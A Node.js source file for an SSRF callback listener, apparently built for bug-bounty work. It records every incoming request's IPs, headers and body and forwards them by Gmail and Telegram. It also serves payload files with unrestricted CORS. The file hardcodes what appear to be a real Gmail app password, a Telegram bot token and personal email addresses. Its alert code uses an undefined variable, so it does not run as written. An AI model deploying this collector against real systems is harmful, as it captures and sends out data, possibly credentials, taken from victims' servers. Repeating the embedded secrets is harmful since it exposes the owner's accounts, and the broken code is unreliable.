const http = require('http');
const path = require('path');
const fs = require('fs');
const nodemailer = require('nodemailer');
const fetch = require('node-fetch');

// === CONFIGURATION ===

// Gmail setup
const gmailUser = 'mzeroaccess@gmail.com';
const gmailPass = 'pext txcx xmsv ytbd';

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: gmailUser,
        pass: gmailPass
    }
});

// Telegram setup
const telegramBotToken = '7610095737:AAFDUe27WjrY3FJKxHCX5F2Tihd-6YP08sA';
const telegramChatId = '599961631';

function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    const data = {
        chat_id: telegramChatId,
        text: message
    };

    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    })
    .then(res => res.json())
    .then(json => {
        if (json.ok) {
            console.log('✅ Telegram message sent');
        } else {
            console.error('❌ Telegram send error:', json);
        }
    })
    .catch(err => console.error('❌ Fetch error:', err));
}

// === SSRF Listener Server ===

const server = http.createServer((req, res) => {
    console.log(`\n📥 ${req.method} Request received ---------------------------------------------------------------`);

    const ipChain = [
        req.headers['x-forwarded-for'],
        req.headers['cf-connecting-ip'],
        req.headers['true-client-ip'],
        req.headers['x-real-ip'],
        req.socket.remoteAddress
    ].filter(Boolean);
    
    console.log(`➡️  IP Chain: ${ipChain.join(' → ')}`);
    console.log(`➡️  URL: ${req.url}`);
    console.log(`🧠 Headers:`, req.headers);

    let bodyChunks = [];
    req.on('data', chunk => bodyChunks.push(chunk));
    req.on('end', () => {
        let rawBody = Buffer.concat(bodyChunks).toString();
        let parsedBody = rawBody;

        if (req.headers['content-type'] && req.headers['content-type'].includes('application/json')) {
            try {
                parsedBody = JSON.stringify(JSON.parse(rawBody), null, 2);
                console.log(`📦 JSON Body:\n${parsedBody}`);
            } catch (err) {
                console.error('❌ Error parsing JSON body:', err.message);
                parsedBody = rawBody; // fallback
            }
        } else {
            console.log(`📦 Body:\n${rawBody}`);
        }

        const fullRequestDetails = `⚡ New Request at ${now}!\n\n` +
            `➡️ IP Chain: ${ipChain.join(' → ')}\n` +
            `➡️ URL: ${req.url}\n\n` +
            `🧠 Headers:\n${JSON.stringify(req.headers, null, 2)}\n\n` +
            `📦 Body:\n${parsedBody || 'No Body'}`;

        // Send Email
        const mailOptions = {
            from: gmailUser,
            to: gmailUser,
            subject: '⚡ SSRF Request Detected!',
            text: fullRequestDetails
        };

        transporter.sendMail(mailOptions, (error, info) => {
            if (error) console.error('❌ Error sending mail:', error);
            else console.log('✅ Mail sent:', info.response);
        });

        // Send Telegram Alert
        sendTelegramMessage(fullRequestDetails);

        // Set CORS header
        res.setHeader('Access-Control-Allow-Origin', '*');

        // Serve payloads if exists
        const safePath = path.normalize(path.join(__dirname, 'public', req.url));
        if (safePath.startsWith(path.join(__dirname, 'public')) && req.url.startsWith('/payload/')) {
            fs.readFile(safePath, (err, content) => {
                if (err) {
                    res.writeHead(404, { 'Content-Type': 'text/plain' });
                    res.end('File Not Found');
                    return;
                }
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(content);
            });
        } else {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ message: 'Active hackerone-theoneabove manuelxantony@gmail.com mzeroaccess@gmail.com'}));
        }
    });
});


const PORT = 4545;
server.listen(PORT, () => {
    console.log(`🚀 SSRF listener running at http://localhost:${PORT}`);
});
